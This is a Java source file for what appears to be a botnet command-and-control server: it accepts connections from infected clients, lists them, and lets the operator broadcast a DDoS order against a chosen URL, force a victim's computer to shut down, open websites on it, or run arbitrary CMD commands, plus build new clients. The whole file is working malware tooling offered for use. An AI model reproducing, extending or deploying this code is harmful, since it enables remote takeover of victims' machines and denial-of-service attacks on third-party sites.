package br.com.pricher.server;

import javax.swing.*;
import java.awt.*;
import java.io.*;
import java.net.MalformedURLException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Scanner;

/**
 * Created by Jeferson Machado on 26/07/2017.
 */
public class Server extends Thread {

    private static final int LOW = 1;
    private static final int MEDIUM = 2;
    private static final int HIGH = 3;

    private static ArrayList<BufferedWriter> clients;
    private static HashMap<BufferedWriter, String> clientsNames;
    private Socket con;
    private BufferedReader bfr;

    private Server(Socket con) {
        this.con = con;
        try {
            InputStream in = con.getInputStream();
            InputStreamReader inr = new InputStreamReader(in);
            bfr = new BufferedReader(inr);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static void sendToAll(String msg) throws IOException {
        for (BufferedWriter bw : clients) {
            bw.write(msg + "\r\n");
            bw.flush();
        }
    }

    private static void sendMsgToClient(BufferedWriter bf, String message) throws IOException {
        if (clients.contains(bf)) {
            bf.write(message + "\r\n");
            bf.flush();
        }
    }

    /***
     * Método main
     * @param args
     */
    public static void main(String[] args) {
        try {
            JLabel lblMessage = new JLabel("Server port:");
            JTextField txtPorta = new JTextField("8094");
            Object[] texts = {lblMessage, txtPorta};
            JOptionPane.showMessageDialog(null, texts);

            final ServerSocket server = new ServerSocket(Integer.parseInt(txtPorta.getText()));

            clientsNames = new HashMap<>();
            clients = new ArrayList<>();

            JOptionPane.showMessageDialog(null, "Server ativo na porta: " + txtPorta.getText());

            new Thread(Server::showOptions).start();

            new Thread(() -> {
                while (true) {
                    //System.out.println("Waiting connection...");
                    Socket con = null;
                    try {
                        con = server.accept();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    //System.out.println("Client connected...");
                    Thread t = new Server(con);
                    t.start();
                }
            }).start();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void showOptions() {
        try {
            do {
                int clientSelected;
                int optionSelected;

                System.out.println("-----------------------------------------");

                if (clients.size() > 0) {
                    Scanner reader = new Scanner(System.in);

                    for (int i = 0; i < clients.size(); i++) {
                        System.out.println("(" + i + ") -> ClientName: " + clientsNames.get(clients.get(i)));
                    }

                    System.out.println("(999) -> DDOS ATK");
                    System.out.println("(666) -> Update List");
                    System.out.println("-----------------------------------------");

                    do {
                        System.out.print("Select a client: >. ");
                        clientSelected = reader.nextInt();
                        if ((clientSelected > clients.size() - 1 || clientSelected < 0) && clientSelected != 666 && clientSelected != 999) {
                            System.out.println("Select a valid client");
                            System.out.println("-----------------------------------------");
                        }
                    }
                    while ((clientSelected > clients.size() - 1 || clientSelected < 0) && clientSelected != 666 && clientSelected != 999);

                    if (clientSelected == 666) {
                        System.out.println("-----------------------------------------");
                        continue;
                    }

                    if (clientSelected == 999) {
                        System.out.println("ENTRY THE TARGET URL: ");
                        reader.nextLine();
                        String urlTarget = reader.nextLine();

                        System.out.println("PRIORITY OF THE ATTACK: ");
                        System.out.println("3 - HIGH");
                        System.out.println("2 - MEDIUM");
                        System.out.println("1 - LOW");

                        int priority = reader.nextInt();

                        switch (priority) {
                            case HIGH:
                                priority = HIGH;
                                break;
                            case MEDIUM:
                                priority = MEDIUM;
                            case LOW:
                                priority = LOW;
                            default:
                                priority = HIGH;
                        }

                        if (!urlTarget.contains("http") || !urlTarget.contains("https")) {
                            urlTarget = "http://" + urlTarget;
                        }
                        String msg = "66&" + urlTarget + "&" + priority;
                        sendToAll(msg);
                        continue;
                    }

                    do {
                        System.out.println("0 - TURN OFF COMPUTER");
                        System.out.println("1 - OPEN PORNOZAO");
                        System.out.println("2 - CMD COMMAND");
                        System.out.println("3 - VOLTAR");

                        System.out.print(">. ");
                        optionSelected = reader.nextInt();

                        if (optionSelected > 3 || optionSelected < 0) {
                            System.out.println("Select a valid option fuck!");
                        }

                    } while (optionSelected > 3 || optionSelected < 0);

                    if (optionSelected == 3) {
                        System.out.println("-----------------------------------------");
                        continue;
                    }

                    String msg;
                    if (optionSelected == 0) {

                        System.out.println("SHUTDOWN TIME (SECONDS): ");
                        long time = reader.nextLong();
                        msg = "0&shutdown -s -t " + (time <= 0 ? 30000 : time);

                    } else if (optionSelected == 1) {
                        System.out.println("ENTRY THE SITE: ");
                        String site = reader.next();
                        msg = "1&" + site;

                    } else if (optionSelected == 2) {
                        System.out.println("ENTRY THE COMMAND: ");
                        reader.nextLine();
                        String command = reader.nextLine();
                        msg = "2&" + (command == null ? "" : command);
                    } else {
                        continue;
                    }

                    try {
                        sendMsgToClient(clients.get(clientSelected), msg);
                        System.out.println("Command send!");
                    } catch (Exception ignored) {
                        removeUser(clients.get(clientSelected));
                    }


                } else {
                    System.out.println("No connected users!");
                    System.out.println("-----------------------------------------");

                    Scanner scan = new Scanner(System.in);
                    System.out.println("777 - Create Client");
                    System.out.println("ANY - Refresh");
                    System.out.print(">. ");

                    int op = scan.nextInt();
                    if (op == 777) {
                        System.out.print("IP >. ");
                        scan.nextLine();
                        String ip = scan.nextLine();
                        System.out.print("PÓRT >. ");
                        String port = scan.nextLine();
                        new MakeClient(ip, port);
                    }
                }
            } while (true);
        } catch (Exception ignored) {
        }
    }

    private static void removeUser(BufferedWriter bufferedWriter) {
        try {
            showNotification(clientsNames.get(bufferedWriter) + " disconnected :C");
            clientsNames.remove(bufferedWriter);
            clients.remove(bufferedWriter);
        } catch (Exception ignored) {
        }
    }

    private static void showNotification(String message) {
        if (SystemTray.isSupported()) {
            try {
                new TrayIcon().displayTray(message);
            } catch (AWTException | MalformedURLException e) {
                e.printStackTrace();
            }
        } else {
            System.err.println("System tray not supported!");
        }
    }

    public void run() {
        try {
            OutputStream outPutStream = this.con.getOutputStream();
            Writer writer = new OutputStreamWriter(outPutStream);
            final BufferedWriter bufferedWriter = new BufferedWriter(writer);
            clients.add(bufferedWriter);
            String name = bfr.readLine();
            clientsNames.put(bufferedWriter, name);

            showNotification(name + " connected :D");

            //if (clients.size() <= 1) showOptions();
            final BufferedReader gambi = bfr;

            new Thread(() -> {
                while (true) {
                    try {
                        String msgg = gambi.readLine();
                        if (msgg == null) {
                            removeUser(bufferedWriter);
                            break;
                        } else {
                            showNotification(msgg);
                        }
                    } catch (IOException e) {
                        removeUser(bufferedWriter);
                        break;
                    }
                }
            }).start();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
